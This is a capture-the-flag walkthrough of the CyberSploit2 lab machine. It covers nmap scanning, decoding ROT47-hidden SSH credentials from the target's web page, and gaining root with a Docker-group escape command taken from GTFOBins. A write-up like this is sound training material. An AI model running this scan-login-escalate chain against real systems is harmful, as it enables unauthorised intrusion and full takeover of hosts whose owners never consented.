
```bash
nmap -sn 192.168.56.0/24
```

 `-sn` -  a **host discovery scan** 

After identifying the target IP address, the hostname was added to the `/etc/hosts` file.

```bash
sudo nano /etc/hosts
```

```bash
nmap -p- -sV cybersploit-2
```


- `-p-` scans all TCP ports.
    
- `-sV` attempts to identify the services and their versions.
    

The scan revealed that the following services were open:

- **HTTP** 80
    
- **SSH**  22
    



The target website was opened in a web browser for manual enumeration.

The webpage contained a table with several rows. During inspection, it was noticed that the information in **Row 4** was unreadable.

![](attachments/Pasted%20image%2020260831144824.png)

This suggested that the text might be encoded or hidden using an encoding technique.

While inspecting the source code, a hidden hint referring to **ROT47** was discovered.

ROT47 is an encoding technique that transforms printable ASCII characters. The hint suggested that the unreadable information in the table was encoded using ROT47.

A ROT47 decoder was used to decode the unreadable text found in the table.

After decoding the information, two important values were discovered:

```text
shailendra
cybersploit1
```

These were identified as valid login credentials:

- **Username:** `shailendra`
    
- **Password:** `cybersploit1`
    

```bash
ssh shailendra@cybersploit-2
```

The password used was:

```text
cybersploit1
```

```bash
ls
```
 and listed a file named

```text
hint.txt
cat hint.txt
```
The hint displayed information related to:

```text
docker
```


Although they didnt give the docker hint i should be able to find it from the id

```bash
[shailendra@localhost ~]$ id
uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Based on the hint, I searched GTFOBins was for possible Docker privilege escalation techniques.

A suitable Docker command was identified:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

paste it in the shell and i got the root


```
h-4.4# whoami
root
sh-4.4# cd /root
sh-4.4# ls
anaconda-ks.cfg  flag.txt  get-docker.sh  logs}
sh-4.4# cat flag.txt
 __    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 
sh-4.4# 

```